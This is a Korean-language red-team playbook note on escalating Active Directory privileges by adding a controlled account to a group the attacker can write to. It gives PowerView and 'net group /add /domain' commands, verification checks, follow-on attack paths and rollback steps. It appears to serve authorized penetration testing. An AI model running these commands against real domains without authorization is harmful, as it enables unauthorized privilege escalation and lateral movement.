---
tags:
  - 환경/ad
시작조건: ["인증된 AD Identity 확보", "대상 그룹의 구성원 변경 권한 확인"]
필요권한: ["GenericWrite, GenericAll, AddSelf 또는 동등한 그룹 멤버십 수정 권한"]
필요조건: ["DC LDAP 접근", "추가할 계정 또는 그룹", "대상 그룹", "변경 전 구성원 목록"]
결과: ["그룹 멤버십", "권한 상승 후보", "추가 AD 객체 제어권 후보"]
---

# AD 그룹 구성원 추가로 권한 확대

## 한 줄 판단

현재 사용하는 AD 계정이 도메인 컨트롤러의 LDAP에 연결할 수 있고 대상 그룹의 `member` 속성을 수정할 권한이 있다면, 제어 중인 계정이나 그룹을 구성원으로 추가한 뒤 새 멤버십이 실제로 부여하는 권한을 확인한다.

## 사용할 때

- 그룹 객체에 대한 `GenericWrite`, `GenericAll`, `AddSelf` 또는 구성원 쓰기 권한이 확인되었을 때.
- 해당 그룹이 다른 고가치 그룹이나 AD 객체에 권한을 부여하는 경로의 중간 단계일 때.
- 추가할 계정 또는 그룹과 원복할 단일 변경을 정확히 기록할 수 있을 때.

## 전제 조건

| 구분 | 조건 | 확인 방법 |
|---|---|---|
| 시작 상태 | 인증된 AD 계정 | 현재 사용자·그룹 토큰 확인 |
| 필요 권한 | 대상 그룹 멤버십 수정 권한 | 현재 계정 SID로 그룹 ACL 확인 |
| 입력·환경 | 대상 그룹과 추가할 계정 또는 그룹 | 변경 전 구성원·중첩 관계 저장 |

## 실행

### 1. 변경 전 구성원 기록

```powershell
Import-Module .\PowerView.ps1
Get-DomainGroupMember -Identity '<TARGET_GROUP>' | Select-Object MemberName,MemberSID
```

### 2. 계정 또는 그룹 추가

#### 명시한 운영자 자격 증명으로 PowerView 실행

```powershell
$OperatorPassword = ConvertTo-SecureString '<OPERATOR_PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<CONTROLLED_USER>', $OperatorPassword)
Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<CONTROLLED_ACCOUNT_OR_GROUP>' -Credential $Cred -Verbose
```

#### 현재 Windows 로그온 계정 권한으로 기본 명령 실행

```cmd
net group "<TARGET_GROUP>" <CONTROLLED_ACCOUNT> /add /domain
```

`net group`은 현재 Windows 로그온 계정의 token으로 변경을 요청한다. 다른 AD 계정의 명시적 자격 증명을 사용해야 하면 PowerView의 `-Credential` 경로를 사용한다.

### 3. 멤버십과 실제 권한 확인

```powershell
Get-DomainGroupMember -Identity '<TARGET_GROUP>' |
  Where-Object { $_.MemberName -eq '<CONTROLLED_ACCOUNT_OR_GROUP>' }
```

확인할 출력:

- 추가한 AD 객체의 `MemberName`과 `MemberSID`.
- 그룹이 부여하는 실제 ACL, 로컬 그룹 또는 서비스 접근 권한은 별도로 재조회한다.
- 기존 로그온 token에는 새 그룹 SID가 즉시 반영되지 않을 수 있다. 새 로그온이나 새 Kerberos 인증 컨텍스트에서 `whoami /groups`와 실제 대상 권한을 다시 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 구성원 재조회에 추가한 AD 객체 표시 | 그룹 변경 성공 | 새 그룹 멤버십 확보 | 그룹의 실제 권한을 확인하고 원복 후 가장 구체적인 상태 라우터로 재평가 |
| 그룹이 고가치 객체 제어권을 부여 | 추가 ACL 경로 확인 | AD 객체 제어권 후보 | [[AD ACL 권한 열거와 공격 경로 식별]]로 다음 세부 작업 선택 |
| 원격 로그인 권한이 실제 확인됨 | 서비스 접근 조건 충족 | 원격 접근 후보 | 원복 후 [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| 추가 성공이나 새 권한 미확인 | 그룹 멤버십과 영향이 불일치 | 멤버십만 변경됨 | 중첩 그룹, 토큰 갱신, GPO와 대상 ACL 확인 |
| access denied | 현재 사용 중인 계정에 수정 권한 없음 | 변경 실패 | ACE 상속·deny·현재 토큰 재검증 |

## 확인할 출력과 권한

- 그룹 구성원 추가는 로컬 관리자, DCSync 또는 원격 로그인 성공을 자동으로 뜻하지 않는다.
- 새 토큰이 필요한 권한은 기존 세션에 즉시 반영되지 않을 수 있으므로 새 로그온과 직접 권한 조회로 확인한다.

## 변경 영향과 복구

| 변경 대상 | 예상 영향 | 검증 방법 | 복구 절차 |
|---|---|---|---|
| 대상 AD 그룹의 `member` 속성 | 추가한 AD 객체에 그룹 기반 권한 부여 | 변경 전·후 구성원 목록 비교 | 이번 작업에서 추가한 AD 객체만 제거 |

```powershell
Remove-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<CONTROLLED_ACCOUNT_OR_GROUP>' -Credential $Cred -Confirm:$false -Verbose
Get-DomainGroupMember -Identity '<TARGET_GROUP>' |
  Where-Object { $_.MemberName -eq '<CONTROLLED_ACCOUNT_OR_GROUP>' }
```

빈 결과를 확인하고, 기존 멤버였던 AD 객체는 제거하지 않는다.

## 관련 공격기법

- [[AD ACL 권한 열거와 공격 경로 식별]]

## 관련 도구

- [[PowerView]]
- [[BloodHound]]

## 관련 상태 라우터

- [[AD Identity 확인 후 도메인 컨텍스트 열거]]
- [[확보한 자격 증명으로 원격 접근 경로 선택]]
